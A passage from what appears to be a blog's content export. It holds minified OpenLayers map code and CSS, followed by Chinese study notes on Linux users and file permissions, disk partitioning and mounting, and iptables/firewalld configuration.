c=a.getAttribute(\"resourceType\");b.resourceUrls||(b.resourceUrls=[]);c=b.resourceUrl[c]={format:a.getAttribute(\"format\"),template:a.getAttribute(\"template\"),resourceType:c};b.resourceUrls.push(c)},WSDL:function(a,b){b.wsdl={};b.wsdl.href=a.getAttribute(\"xlink:href\")},ServiceMetadataURL:function(a,\nb){b.serviceMetadataUrl={};b.serviceMetadataUrl.href=a.getAttribute(\"xlink:href\")},LegendURL:function(a,b){b.legend={};b.legend.href=a.getAttribute(\"xlink:href\");b.legend.format=a.getAttribute(\"format\")},Dimension:function(a,b){var c={values:[]};this.readChildNodes(a,c);b.dimensions.push(c)},Default:function(a,b){b[\"default\"]=this.getChildValue(a)},Value:function(a,b){b.values.push(this.getChildValue(a))}},ows:OpenLayers.Format.OWSCommon.v1_1_0.prototype.readers.ows},CLASS_NAME:\"OpenLayers.Format.WMTSCapabilities.v1_0_0\"});\n\n```\n\n\n\n\n\n> style.css\n\n```css\ndiv.olMap {\n    z-index: 0;\n    padding: 0 !important;\n   /*margin: 0 !important;*/\n    cursor: default;\n}\n\ndiv.olMapViewport {\n    text-align: left;\n    -ms-touch-action: none;\n}\n\ndiv.olLayerDiv {\n   -moz-user-select: none;\n   -khtml-user-select: none;\n}\n\n.olLayerGoogleCopyright {\n    left: 2px;\n    bottom: 2px;\n}\n.olLayerGoogleV3.olLayerGoogleCopyright {\n    right: auto !important;\n}\n.olLayerGooglePoweredBy {\n    left: 2px;\n    bottom: 15px;\n}\n.olLayerGoogleV3.olLayerGooglePoweredBy {\n    bottom: 15px !important;\n}\n/* GMaps should not set styles on its container */\n.olForeignContainer {\n    opacity: 1 !important;\n}\n.olControlAttribution {\n    font-size: smaller;\n    right: 3px;\n    bottom: 4.5em;\n    position: absolute;\n    display: block;\n}\n.olControlScale {\n    right: 3px;\n    bottom: 3em;\n    display: block;\n    position: absolute;\n    font-size: smaller;\n}\n.olControlScaleLine {\n   display: block;\n   position: absolute;\n   left: 10px;\n   bottom: 15px;\n   font-size: xx-small;\n}\n.olControlScaleLineBottom {\n   border: solid 2px black;\n   border-bottom: none;\n   margin-top:-2px;\n   text-align: center;\n}\n.olControlScaleLineTop {\n   border: solid 2px black;\n   border-top: none;\n   text-align: center;\n}\n\n.olControlPermalink {\n    right: 3px;\n    bottom: 1.5em;\n    display: block;\n    position: absolute;\n    font-size: smaller;\n}\n\ndiv.olControlMousePosition {\n    bottom: 0;\n    right: 3px;\n    display: block;\n    position: absolute;\n    font-family: Arial;\n    font-size: smaller;\n}\n\n.olControlOverviewMapContainer {\n    position: absolute;\n    bottom: 0;\n    right: 0;\n}\n\n.olControlOverviewMapElement {\n    padding: 10px 18px 10px 10px;\n    background-color: #00008B;\n    -moz-border-radius: 1em 0 0 0;\n}\n\n.olControlOverviewMapMinimizeButton,\n.olControlOverviewMapMaximizeButton {\n    height: 18px;\n    width: 18px;\n    right: 0;\n    bottom: 80px;\n    cursor: pointer;\n}\n\n.olControlOverviewMapExtentRectangle {\n    overflow: hidden;\n    background-image: url(\"img/blank.gif\");\n    cursor: move;\n    border: 2px dotted red;\n}\n.olControlOverviewMapRectReplacement {\n    overflow: hidden;\n    cursor: move;\n    background-image: url(\"img/overview_replacement.gif\");\n    background-repeat: no-repeat;\n    background-position: center;\n}\n\n.olLayerGeoRSSDescription {\n    float:left;\n    width:100%;\n    overflow:auto;\n    font-size:1.0em;\n}\n.olLayerGeoRSSClose {\n    float:right;\n    color:gray;\n    font-size:1.2em;\n    margin-right:6px;\n    font-family:sans-serif;\n}\n.olLayerGeoRSSTitle {\n    float:left;font-size:1.2em;\n}\n\n.olPopupContent {\n    padding:5px;\n    overflow: auto;\n}\n\n.olControlNavigationHistory {\n   background-image: url(\"img/navigation_history.png\");\n   background-repeat: no-repeat;\n   width:  24px;\n   height: 24px;\n\n}\n.olControlNavigationHistoryPreviousItemActive {\n  background-position: 0 0;\n}\n.olControlNavigationHistoryPreviousItemInactive {\n   background-position: 0 -24px;\n}\n.olControlNavigationHistoryNextItemActive {\n   background-position: -24px 0;\n}\n.olControlNavigationHistoryNextItemInactive {\n   background-position: -24px -24px;\n}\n\ndiv.olControlSaveFeaturesItemActive {\n    background-image: url(img/save_features_on.png);\n    background-repeat: no-repeat;\n    background-position: 0 1px;\n}\ndiv.olControlSaveFeaturesItemInactive {\n    background-image: url(img/save_features_off.png);\n    background-repeat: no-repeat;\n    background-position: 0 1px;\n}\n\n.olHandlerBoxZoomBox {\n    border: 2px solid red;\n    position: absolute;\n    background-color: white;\n    opacity: 0.50;\n    font-size: 1px;\n    filter: alpha(opacity=50);\n}\n.olHandlerBoxSelectFeature {\n    border: 2px solid blue;\n    position: absolute;\n    background-color: white;\n    opacity: 0.50;\n    font-size: 1px;\n    filter: alpha(opacity=50);\n}\n\n.olControlPanPanel {\n    top: 10px;\n    left: 5px;\n}\n\n.olControlPanPanel div {\n    background-image: url(img/pan-panel.png);\n    height: 18px;\n    width: 18px;\n    cursor: pointer;\n    position: absolute;\n}\n\n.olControlPanPanel .olControlPanNorthItemInactive {\n    top: 0;\n    left: 9px;\n    background-position: 0 0;\n}\n.olControlPanPanel .olControlPanSouthItemInactive {\n    top: 36px;\n    left: 9px;\n    background-position: 18px 0;\n}\n.olControlPanPanel .olControlPanWestItemInactive {\n    position: absolute;\n    top: 18px;\n    left: 0;\n    background-position: 0 18px;\n}\n.olControlPanPanel .olControlPanEastItemInactive {\n    top: 18px;\n    left: 18px;\n    background-position: 18px 18px;\n}\n\n.olControlZoomPanel {\n    top: 71px;\n    left: 14px;\n}\n\n.olControlZoomPanel div {\n    background-image: url(img/zoom-panel.png);\n    position: absolute;\n    height: 18px;\n    width: 18px;\n    cursor: pointer;\n}\n\n.olControlZoomPanel .olControlZoomInItemInactive {\n    top: 0;\n    left: 0;\n    background-position: 0 0;\n}\n\n.olControlZoomPanel .olControlZoomToMaxExtentItemInactive {\n    top: 18px;\n    left: 0;\n    background-position: 0 -18px;\n}\n\n.olControlZoomPanel .olControlZoomOutItemInactive {\n    top: 36px;\n    left: 0;\n    background-position: 0 18px;\n}\n\n/*\n * When a potential text is bigger than the image it move the image\n * with some headers (closes #3154)\n */\n.olControlPanZoomBar div {\n    font-size: 1px;\n}\n\n.olPopupCloseBox {\n  background: url(\"img/close.gif\") no-repeat;\n  cursor: pointer;\n}\n\n.olFramedCloudPopupContent {\n    padding: 5px;\n    overflow: auto;\n}\n\n.olControlNoSelect {\n -moz-user-select: none;\n -khtml-user-select: none;\n}\n\n.olImageLoadError {\n    opacity: 0;\n}\n\n/**\n * Cursor styles\n */\n\n.olCursorWait {\n    cursor: wait;\n}\n.olDragDown {\n    cursor: move;\n}\n.olDrawBox {\n    cursor: crosshair;\n}\n.olControlDragFeatureOver {\n    cursor: move;\n}\n.olControlDragFeatureActive.olControlDragFeatureOver.olDragDown {\n    cursor: -moz-grabbing;\n}\n\n/**\n * Layer switcher\n */\n.olControlLayerSwitcher {\n    position: absolute;\n    top: 25px;\n    right: 0;\n    width: 20em;\n    font-family: sans-serif;\n    font-weight: bold;\n    margin-top: 3px;\n    margin-left: 3px;\n    margin-bottom: 3px;\n    font-size: smaller;\n    color: white;\n    background-color: transparent;\n}\n\n.olControlLayerSwitcher .layersDiv {\n    padding-top: 5px;\n    padding-left: 10px;\n    padding-bottom: 5px;\n    padding-right: 10px;\n    background-color: darkblue;\n}\n\n.olControlLayerSwitcher .layersDiv .baseLbl,\n.olControlLayerSwitcher .layersDiv .dataLbl {\n    margin-top: 3px;\n    margin-left: 3px;\n    margin-bottom: 3px;\n}\n\n.olControlLayerSwitcher .layersDiv .baseLayersDiv,\n.olControlLayerSwitcher .layersDiv .dataLayersDiv {\n    padding-left: 10px;\n}\n\n.olControlLayerSwitcher .maximizeDiv,\n.olControlLayerSwitcher .minimizeDiv {\n    width: 18px;\n    height: 18px;\n    top: 5px;\n    right: 0;\n    cursor: pointer;\n}\n\n.olBingAttribution {\n    color: #DDD;\n}\n.olBingAttribution.road {\n    color: #333;\n}\n\n.olGoogleAttribution.hybrid, .olGoogleAttribution.satellite {\n    color: #EEE;\n}\n.olGoogleAttribution {\n    color: #333;\n}\nspan.olGoogleAttribution a {\n    color: #77C;\n}\nspan.olGoogleAttribution.hybrid a, span.olGoogleAttribution.satellite a {\n    color: #EEE;\n}\n\n/**\n * Editing and navigation icons.\n * (using the editing_tool_bar.png sprint image)\n */\n.olControlNavToolbar ,\n.olControlEditingToolbar {\n    margin: 5px 5px 0 0;\n}\n.olControlNavToolbar div,\n.olControlEditingToolbar div {\n    background-image: url(\"img/editing_tool_bar.png\");\n    background-repeat: no-repeat;\n    margin: 0 0 5px 5px;\n    width: 24px;\n    height: 22px;\n    cursor: pointer\n}\n/* positions */\n.olControlEditingToolbar {\n    right: 0;\n    top: 0;\n}\n.olControlNavToolbar {\n    top: 295px;\n    left: 9px;\n}\n/* layouts */\n.olControlEditingToolbar div {\n    float: right;\n}\n/* individual controls */\n.olControlNavToolbar .olControlNavigationItemInactive,\n.olControlEditingToolbar .olControlNavigationItemInactive {\n    background-position: -103px -1px;\n}\n.olControlNavToolbar .olControlNavigationItemActive ,\n.olControlEditingToolbar .olControlNavigationItemActive  {\n    background-position: -103px -24px;\n}\n.olControlNavToolbar .olControlZoomBoxItemInactive {\n    background-position: -128px -1px;\n}\n.olControlNavToolbar .olControlZoomBoxItemActive  {\n    background-position: -128px -24px;\n}\n.olControlEditingToolbar .olControlDrawFeaturePointItemInactive {\n    background-position: -77px -1px;\n}\n.olControlEditingToolbar .olControlDrawFeaturePointItemActive {\n    background-position: -77px -24px;\n}\n.olControlEditingToolbar .olControlDrawFeaturePathItemInactive {\n    background-position: -51px -1px;\n}\n.olControlEditingToolbar .olControlDrawFeaturePathItemActive {\n    background-position: -51px -24px;\n}\n.olControlEditingToolbar .olControlDrawFeaturePolygonItemInactive{\n    background-position: -26px -1px;\n}\n.olControlEditingToolbar .olControlDrawFeaturePolygonItemActive {\n    background-position: -26px -24px;\n}\n\ndiv.olControlZoom {\n    position: absolute;\n    top: 8px;\n    left: 8px;\n    background: rgba(255,255,255,0.4);\n    border-radius: 4px;\n    padding: 2px;\n}\ndiv.olControlZoom a {\n    display: block;\n    margin: 1px;\n    padding: 0;\n    color: white;\n    font-size: 18px;\n    font-family: 'Lucida Grande', Verdana, Geneva, Lucida, Arial, Helvetica, sans-serif;\n    font-weight: bold;\n    text-decoration: none;\n    text-align: center;\n    height: 22px;\n    width:22px;\n    line-height: 19px;\n    background: #130085; /* fallback for IE - IE6 requires background shorthand*/\n    background: rgba(0, 60, 136, 0.5);\n    filter: alpha(opacity=80);\n}\ndiv.olControlZoom a:hover {\n    background: #130085; /* fallback for IE */\n    background: rgba(0, 60, 136, 0.7);\n    filter: alpha(opacity=100);\n}\n@media only screen and (max-width: 600px) {\n    div.olControlZoom a:hover {\n        background: rgba(0, 60, 136, 0.5);\n    }\n}\na.olControlZoomIn {\n    border-radius: 4px 4px 0 0;\n}\na.olControlZoomOut {\n    border-radius: 0 0 4px 4px;\n}\n\n\n/**\n * Animations\n */\n\n.olLayerGrid .olTileImage {\n    -webkit-transition: opacity 0.2s linear;\n    -moz-transition: opacity 0.2s linear;\n    -o-transition: opacity 0.2s linear;\n    transition: opacity 0.2s linear;\n}\n\n/* Turn on GPU support where available */\n.olTileImage {\n    -webkit-transform: translateZ(0);\n    -moz-transform: translateZ(0);\n    -o-transform: translateZ(0);\n    -ms-transform: translateZ(0);\n    transform: translateZ(0);\n    -webkit-backface-visibility: hidden;\n    -moz-backface-visibility: hidden;\n    -ms-backface-visibility: hidden;\n    backface-visibility: hidden;\n    -webkit-perspective: 1000;\n    -moz-perspective: 1000;\n    -ms-perspective: 1000;\n    perspective: 1000;\n}\n\n/* when replacing tiles, do not show tile and backbuffer at the same time */\n.olTileReplacing {\n    display: none;\n}\n\n/* override any max-width image settings (e.g. bootstrap.css) */\nimg.olTileImage {\n    max-width: none;\n}\ncss\n```\n\n\n\n标注的图标文件：\n\nhttp://image.xpshuai.cn/pins.png\n\nhttp://image.xpshuai.cn/pinsback.png\n\ndemo项目文件：\nhttps://github.com/shuai06/openlayer2_Cluster_demo\n\n","tags":["openlayer"],"categories":["GIS "]},{"title":"Linux用户身份与文件权限","url":"%2Fposts%2F62d07350%2F","content":"\n\n\n\n  \n# 用户身份与文件权限\n\n- **用户** \n\n 1.管理员    root     UID:  0  \n2. 系统用户     5/6    UID: 1-499  \n                    红帽7        UID 1-999\n                    /sbin/nologin  \n3.普通用户    5/6     500-65535\n                    7         1000-\n\n\n  ```\n id xps   # 查看用户信息\n useradd\nuseradd -u 555 xps   # 新建用户并指定uid\nuseradd -u ssbin/nologin xps   # 指定终端\nadduser\n\ngroupadd hhh   # 新建用户组\n\nusermod -G hhh xps   # 基本组/扩展组\nusermod -u 666 xps   # 修改uid\n\ngroupdel hhh    # 删除用户组\npasswd xps   # 重置密码\n\n\nuserdel xps   # 删除用户(不删除home等)\nuserdel -r xps   # 删除用户(信息全删除）\ndeluser\n\n#修改name的话可以直接去 /etc/passwd修改\n\n  ```\n\n\n- **文件权限**  \n```\n文件类型\n➢ -：普通文件。\n➢ d：目录文件。\n➢ l：链接文件。\n➢ b：块设备文件。\n➢ c：字符设备文件。\n➢ p：管道文件。\n\n```\n\n```\nr读4\nw写2\nx执行1\n\n===============\nchmod  # 权限   格式为“chown [参数] 所有者:所属组 文件或目录名称”     chown root:bin test\nchown   # 所有者，属性\n\n-Rf    # 强制的意思\n\nchmod -Rf 777 test/\nchmod -Rf g+s test/           # 并为该目录设置了 SGID 特殊权限位\n\nchmod -R o+t linux/          # 设置sbit权限 保护位\n```\n\n\n- **文件的特殊权限**  \n```\n1.**SUID**    # 让程序执行者，临时获取程序所有者的身份（仅对拥有执行权限的二进制程序有效）\nu+s   4\n\n2.**SGID**    # 让程序执行者，临时获取程序所有组的身份\n            让目录内的新建文件，集成目录所有组的名称\n g+s  2         \n          \n3.**SBIT**    #让目录内的文件，**只能自己删除自己**的\nRHEL 7 系统中的/tmp 作为一个共享文件的目录，默认已经设置了 SBIT 特殊权限位，因此除非是该目录的所有者，否则无法删除这里面的文件；\n当目录被设置 SBIT 特殊权限位后，文件的其他人权限部分的 x 执行权限就会被替换成 t 或者 T，原本有 x 执行权限则会写成 t，原本没有 x 执行权限则会被写成 T\no+t   1\n\n\nsuid:  \nx 改变成 s 就意味着该文件被赋予了 SUID 权限。如果原本的权限是 rw-呢？如果原先权\n限位上没有 x 执行权限，那么被赋予特殊权限后将变成大写的 S\ns 证明原先有x\nS  证明原先没有x\n\nsgid:  \ns 证明原先有x\nS  证明原先没有x\n\nsbit:  \n对其他目录来设置 SBIT 特殊权限位，用 chmod 命令就可以了。对应的参数 o+t 代表设置 SBIT 粘滞位权限：\nt 证明原先有\nT  证明原先没有x\n\n例如： \n转换7654    # 7是特殊权限位， 654是一一般权限位\n    420 401 400\n    rw- r-x r--\n    7: = 4+2+1 三个都涉及了,所以要都加上    # S->之前没有x权限，s->之前有x权限,T->之前没有...\n      rwSrwsr-T\n======\nrwsr--rwT\n\nrwxr--rw-   746\ns=4,T=4\n5746\n\n======\nr-Srws--T\n\n5470\n\n\n```\n\n\n\n\n- **文件的隐藏属性**  \n```\n1.chattr          设置文件的隐藏权限，格式为“chattr [参数] 文件”\n            chattr +a /var/log/message\n2. lsattr          显示文件的隐藏权限，格式为“lsattr [参数] 文件”\n            lsattr -d Desktop/   $ 查看目录的...\n```\n表 5-6 chattr 命令中用于隐藏权限的参数及其作用\n\n|   参数  |   含义    |\n| --- | --- |\n|  i   |  无法对文件进行修改；若对目录设置了该参数，则仅能修改其中的子文件内容而不能新建或删除文件   |\n|  a   |   仅允许补充（追加）内容，无法覆盖/删除内容（Append Only）   |\n|  S    |  文件内容在变更后立即同步到硬盘（sync）   |\n|  s   |    彻底从硬盘中删除，不可恢复（用 0 填充原文件所在硬盘区域）  |\n|  A   |    不再修改这个文件或目录的最后访问时间（atime）  |\n|   b  |   不再修改文件或目录的存取时间   |\n|  D   |    检查压缩文件中的错误  |\n|  d   |    使用 dump 命令备份时忽略本文件/目录  |\n|  c   |  默认将文件或目录进行压缩    |\n|  u   |  当删除该文件后依然保留其在硬盘中的数据，方便日后恢复   |\n|   t  |   让文件系统支持尾部合并（tail-merging）   |\n|   X  |   可以直接访问压缩文件中的内容   |\n\n\n\n\n- **文件访问控制列表 ACL**  \n```\n对某个指定的用户进行单独的权限控制  \n如果针对某个目录设置了 ACL，则目录中的文件会继承其 ACL；若针对文件设置了 ACL，则文件不再继承其所在目录的 ACL\n\n```\n\n```\n1.setfacl 命令\n(针对目录文件需要使用-R 递归参数；\n针对普通文件则使用-m 参数；\n如果想要删除某个文件的 ACL，则可以使用-b 参数)  \n setfacl -Rm u:xps:rwx /root      # -m 修改\n setfacl -Rm g:xpsg:r-x /tmp\n看到文件的权限最后一个点（.）变成了加号（+） ,这就意味着该文件已经设置了 ACL 了。\n\n2.getfacl\n\n```\n\n\n- su 与sudo  \n```\nsu - xps\nsu 命令与用户名之间有一个减号（-），这意味着完全切换到新的用户，即把环境变量信息也变更为新用户的相应信息，而不是保留原始的信息。强烈建议在切换用户身份时添加这个减号（-）\n\n\n使用 sudo 命令把特定命令的执行权限赋予给指定用户(避免泄露 root 管理员密码)\n\n**sudo 服务中的可用参数以及作用**   \n-h 列出帮助信息\n-l 列出当前用户可执行的命\n-u 用户名或 UID 值 以指定的用户身份执行命\n-k 清空密码的有效时间，下\n-b 在后台执行指定的命令\n-p 更改询问密码的提示语\n\n\n**sudo 命令具有如下功能：**\n➢ 限制用户执行指定的命令：\n➢ 记录用户执行的每一条命令；\n➢ 配置文件（/etc/sudoers）提供集中的用户管理、权限与主机等参数；\n➢ 验证密码的后 5 分钟内（默认值）无须再让用户再次验证密码。\n\n\n使用 sudo 命令提供的 visudo 命令\n来配置用户权限。这条命令在配置用户权限时将禁止多个用户同时修改 sudoers 配置文件，还\n可以对配置文件内的参数进行语法检查，并在发现参数错误时进行报错。\n(只有root才能使用visudo编辑所服务的配置文件)\n\n\n在 sudo 命令的配置文件中，按照下\n面的格式将第 99 行（大约）填写上指定的信息：\n谁可以使用 允许使用的主机=(以谁的身份) 可执行命令的列表\nxps ALL=(ALL) ALL\n\n\n\n如果需要让某个用户只能使用 root 管理员的身份执行指定的命令，切记一定要给\n出该命令的绝对路径，否则系统会识别不出来。\n先使用 whereis 命令找出命令所对应\n的保存路径，然后把配置文件第 99 行的用户权限参数修改成对应的路径即可\nxps ALL=(ALL) /usr/bin/cat\n\n\n加 NOPASSWD 参数，使得用户执行 sudo 命令时不再需要密码验证：\n xps ALL=NOPASSWD: /usr/sbin/poweroff\n\n\n```","tags":["Linux，文件权限"],"categories":["Linux"]},{"title":"Linux存储结构与磁盘划分","url":"%2Fposts%2F1e68cff8%2F","content":"\n\n  \n# 存储结构与磁盘划分\n  \n```\n/boot 开机所需文件—内核、开机菜单以及所需配置文件等\n/dev 以文件形式存放任何设备与接口  # \n/etc 配置文件   #\n/home 用户家目录   # \n/bin 存放单用户模式下还可以操作的命令\n/lib 开机时用到的函数库，以及/bin 与/sbin 下面的命令要调用的函数\n/sbin 开机过程中需要的命令\n/media 用于挂载设备文件的目录        # \n/opt 放置第三方的软件\n/root 系统管理员的家目录     # \n/srv 一些网络服务的数据文件目录\n/tmp 任何人均可使用的“共享”临时目录\n/proc 虚拟文件系统，例如系统内核、进程、外部设备及网络状态等     # \n/usr/local 用户自行安装的软件         # \n/usr/sbin Linux 系统开机时不会使用到的软件/命令/脚本\n/usr/share 帮助与说明文件，也可放置共享文件   # \n/var 主要存放经常变化的文件，如日志           # \n/lost+found 当文件系统发生错误时，将一些丢失的文件片段存放在这里\n```\n\n\n```\n常见的硬件设备及其文件名称\n\nIDE 设备 /dev/hd[a-d]\nSCSI/SATA/U 盘 /dev/sd[a-p]\n软驱 /dev/fd[0-1]\n打印机 /dev/lp[0-15]\n光驱 /dev/cdrom\n鼠标 /dev/mouse\n磁带机 /dev/st0 或/dev/ht0\n\n\n\n系统采用 a～p 来代表 16 块不同的硬盘（默认从 a 开始分配），而且硬盘的分区编号也很有讲究：\n➢ 主分区或扩展分区的编号从 1 开始，到 4 结束；\n➢ 逻辑分区从编号 5 开始。\n\n主分区不能超过 4 个\n\n\n\n```\n\n\n  \n- 挂载硬件设备  \n**mount 命令**\n```\n用于挂载文件系统，格式为“mount 文件系统 挂载目录”\nmount 命令中的参数以及作用\n-a 挂载所有在/etc/fstab 中定义的文件系统   ,执行后自动检查\n/etc/fstab 文件中有无疏漏被挂载的设备文件，如果有，则进行自动挂载操作\n-t 指定文件系统的类型\n\n例如，要把设备/dev/sdb2 挂载到/backup 目录:\nmount /dev/sdb2 /backup     # 重启后挂载就会失效\n\n\n#永久配置\n把挂载信息按照指定的填写格式\n“设备文件 挂载目录 格式类型 权限选项 是否备份 是否自检”\n写入到 /etc/fstab 文件中\n\n#用于挂载信息的指定填写格式中，各字段所表示的意义\n设备文件    一 般 为 设 备 的 路 径 + 设 备 名 称 ， 也 可 以 写 唯 一 识 别 码 （ UUID ，Universally Unique Identifier）\n挂载目录    指定要挂载到的目录，需在挂载前创建好\n格式类型    指定文件系统的格式，比如 Ext3、 Ext4、 XFS、 SWAP、 iso9660（此为光盘设备）等\n权限选项    若设置为 defaults，则默认权限为： rw, suid, dev, exec, auto, nouser, async\n是否备份    若为 1 则开机后使用 dump 进行磁盘备份，为 0 则不备份\n是否自检    若为 1 则开机后自动进行磁盘自检，为 0 则不自检\n\n#例如：\n将文件系统为 ext4 的硬件设备/dev/sdb2 在开机后自动挂载到/backup 目录上，并保持默认权限且无需开机自检\nvim /etc/fstab\n\n/dev/sdb2        /backup     ext4     defaults     0      0\n\n```\n\n**umount 命令**\n\n```\numount [挂载点/设备文件]\n\numount /dev/sdb2\n```\n\n- 添加硬盘设备  \n```\n#操作思路：首先需要在虚拟机中模拟添加入一块新的硬盘存储设备，然后再进行分区、格式化、挂载等操作，最后通过检查系统的挂载状态并真实地使用硬盘来验证硬盘设备是否成功添加\n\n现在虚拟机中添加一个新的虚拟硬盘\n\n```\n\n**fdisk 命令**\n\n```\n\"fdisk [磁盘名称]\"，它提供了集添加、删除、转换分区等功能于一身的“一站式分区服务”\n交互式\n\n#fdisk 命令中的参数以及作用\nm     查看全部可用的参数\nn     添加新的分区\nd     删除某个分区信息\nl     列出所有可用的分区类型\nt     改变某个分区的类型\np     查看分区信息  \nw     保存并退出\nq     不保存直接退出\n\n\n===\n在确认创建一个主分区后，系统要求您先输入主分区的编号。我们在前文得知，主分区的编\n号范围是 1～4，因此这里输入默认的 1 就可以了.\n接下来系统会提示定义起始的扇区位置，这不\n需要改动，我们敲击回车键保留默认设置即可，系统会自动计算出最靠前的空闲扇区的位置。最\n后，系统会要求定义分区的结束扇区位置，这其实就是要去定义整个分区的大小是多少。我们不\n用去计算扇区的个数，只需要输入+2G 即可创建出一个容量为 2GB 的硬盘分区\n\n敲击参数 w 后回车，这样分区信息才是真正的写入成功啦\n\n===\n使用 file 命令查看该文件的属性,\nfile /dev/sdb1\n可以输入 partprobe 命令手动将分区信息同步到内核，而且一般推荐连续\n两次执行该命令，效果会更好。如果使用这个命令都无法解决问题，那么就重启计算机吧\npartprobe\npartprobe\nfile /dev/sdb1\n\n===\nmkfs\n如果硬件存储设备没有进行格式化，则 Linux 系统无法得知怎么在其上写入数据。因此，\n在对存储设备进行分区后还需要进行格式化操作。在 Linux 系统中用于格式化操作的命令是\nmkfs。这条命令很有意思，因为在 Shell 终端中输入 mkfs 名后再敲击两下用于补齐命令的 Tab键\n\nmkfs.文件类型名称\n#例如:\n要格式分区为 XFS 的文件系统\n mkfs.xfs /dev/sdb1\n\n===\n挂载并使用存储设备\n步骤：\n首先是创建一个用于挂载设备的挂载点目录；\n然后使用 mount 命\n令将存储设备与挂载点进行关联；\n最后使用 df -h 命令来查看挂载状态和硬盘使用量信息。\n mkdir /newFS\n mount /dev/sdb1 /newFS/\n df -h\n```\n\n**du 命令**\n\n```\n查看文件数据占用量\n格式为“du [选项] [文件]”\n\n du -sh /* 命令 来查看在 Linux 系统根目录下所有一级目录分别占用的空间大小\n```\n\n- **添加交换分区**  \n```\n为了解决真实物理内存不足的问题     ,\n通过在硬盘中预先划分一定的空间，然后将把内存中暂时不常用的数据临时存放到硬盘中，以便腾出物理内存空间让更活跃的程序服务来使用的技术\n\n#交换分区的划分建议：在生产环境中，交换分区的\n大小一般为真实物理内存的   1.5～2   倍，为了让大家更明显地感受交换分区空间的变化，这里\n取出一个大小为 5GB 的主分区作为交换分区资源。在分区创建完毕后保存并退出即可：\n\n==\nSWAP 分区专用的格式化命令  mkswap\nmkswap /dev/sdb2\n\n使用  swapon  命令把准备好的 SWAP 分区设备正式挂载到系统中。\nswapon /dev/sdb5\n\nfree -m   查看交换分区的大小变化\n\nvim /etc/fstab\n/dev/sdb2     swap     swap     defaults     0     0\n```\n\n\n\n- **磁盘容量配额   \tquota**\n```\n#介绍\nquota     -- 限制每个人能够使用的磁盘容量\n\ninode  个数\n    isoft    # 只是警告提醒，日志\n    ihard  # 强制限制\nblock 容量\n\ndefaults  \n\n\n\n```\n\nxfs_uquota\n```\n#\nxfs_uquota -x -c 'limit bsoft=3m bhard=6m isoft=3 ihard=6 xps'  /boot\n\n\n```\n\n\n**edquota    修改配额**\n```\nedquota xps\n\n\n```\n\n- 软硬方式链接  \n```\nln 命令\n格式为“ln [选项] 目标\n\n#参数\n-s 创建“符号链接”（如果不带-s 参数，则默认创建硬链接）\n-f 强制创建文件或目录的链接\n-i 覆盖前先询问\n-v 显示创建链接的过程\n\n#硬连接 -> 源文件删除也没事\n```\n\n\n- 剖析ll文件参数信息  \n```\n-rw-r--r--. 1 root root 813 Apr 15  2014 yum.conf\n\n.   -> facl +\n1  多少块\n813  占用实际大小\n Apr 15  2014  最后修改文件的时间\n \n```","tags":["rhel"],"categories":["Linux"]},{"title":"iptables与firewall","url":"%2Fposts%2Fa3db7b71%2F","content":"\n\n  \n# iptables与firewall防火墙\n\n\n  \n- **配置网卡文件**  \n1. 修改配置文件  \n```\nvim /etc/sysconfig/network-scripts/ifcfg-eno16777736\n\n#文件内容如下\nHWADDR=\"00:0C:29:C2:F1:76\"\nTYPE=\"Ethernet\"     #类型\nBOOTPROTO=\"dhcp\"\nDEFROUTE=\"yes\"\nPEERDNS=\"yes\"\nPEERROUTES=\"yes\"\nIPV4_FAILURE_FATAL=\"no\"\nIPV6INIT=\"yes\"\nIPV6_AUTOCONF=\"yes\"\nIPV6_DEFROUTE=\"yes\"\nIPV6_PEERDNS=\"yes\"\nIPV6_PEERROUTES=\"yes\"\nIPV6_FAILURE_FATAL=\"no\"\nNAME=\"eno16777736\"\nUUID=\"af3aaad5-b615-493c-872e-76503b9adad5\"  #唯一标识\nONBOOT=\"yes\"   #开机自启\n```\n\n 2. 基于图形界面配置网卡  **nmtuio** \n ```\n nmtuio \n\nsystemctl restart network  \n ```\n\n\n3.  nm-connection-editor工具  \n```\nnm-connection-editor\n```\n\n4. 图形界面点击右上角\n\n\n\n- **配置防火墙**  \n规则： 自上而下做匹配\n几种状态\n```\naccept  允许流量通过\nreject    明确拒绝\ndrop        对方不知道你是否在线(显示超时)\n\n\n```\n\n1. **iptables**  \n```\n比较老,逐渐被取代\n基于命令行\n难度最高\n\niptables -L    #显示所有的策略\niptables -F       #清空所有策略\niptables -P INPUT DROP     #默认禁止所有流量策略,不能reject\n\n-I  #插入到最前面\n-A   #插入到最后面\n-p  # 允许的协议\n--dport     #本机端口\n-s    #来源\n-j    #本身为意义，后面跟动作\n\n\niptables -I  INPUT -p icmp -j ACCEPT  #只允许外部到内部的ping\n\niptables -I INPUT -s 192.168.10.0/24 -p tcp  --dport 22 #允许来自某个网段的访问，端口为22\n\n-D #删除某一条\niptables -D INPUT 1  #删除第一条\n\niptables -I INPUT -p tcp --port 22 -j REJECT  #禁止外部所有22端口的流量\n\niptables -I INPUT -p tcp --port 22:200 -j REJECT  #禁止外部所有20到200端口的流量\n\n\nservice iptables save\n\n```\n\n**firewalld 防火墙(分为下面两个)** \n```\nzone  区域\nsbit    安全位\npublic    默认策略,当前使用\n\n```\n\n2. **firewall-cmd 命令行**\n```\nRuntime  当前生效，重启后失效\nPremanent 当前暂时不生效，但是永久生效\n--premanent       # 建议添加这个\n\nfirewall-cmd -reload     #重启\n\nfirewall-cmd --get-default-zone    #查看当前区域\n\nfirewall-cmd --set-default-zone=drop    #切换默认区域到丢包\n\nfirewall-cmd --permanent --zone=drop --change-interface=en0167777  #重启之后，把这个网卡区域换为drop\nfirewall-cmd --permanent get-zone-of-interface=en0167777  #重启之后，查看\n\n紧急模式\nfirewall-cmd --panic-on    #切断所有网络连接，包括ping的数据包\nfirewall-cmd --panic-off    #关闭紧急模式\n\n查询服务\nfirewall-cmd --zone=public --query-service=http    #查看是否允许http\nfirewall-cmd --zone=public --query-service=ssh\n\n添加允许服务\nfirewall-cmd --zone=public --add-servcice=http    #允许从外访问http服务\n\nfirewall-cmd --zone=public --add-servcice=https    #重启才可以 firewall-cmd --reload\nfirewall-cmd --zone=public --add-servcice=https\n\n禁止服务\nfirewall-cmd --zone=public --remove-servcice=https\n\nfirewall-cmd --permanent --zone=public --add-servcice=https\nfirewall-cmd --permanent --zone=public --query-servcice=https    \n\n\n添加端口号\nfirewall-cmd --zone=public --add-port=8080/tcp    #把这个端口添加到ctp协议组，允许\nfirewall-cmd --zone=public --add-port=80-90/tcp    #端口端\n\n\n端口转发（隐藏原始端口）\nfirewall-cmd --permanent --zone=public --add-forward-port=888:porto:tcp:toport=22:toaddr=192.168.10.10    #转发888到22\nfirewall-cmd 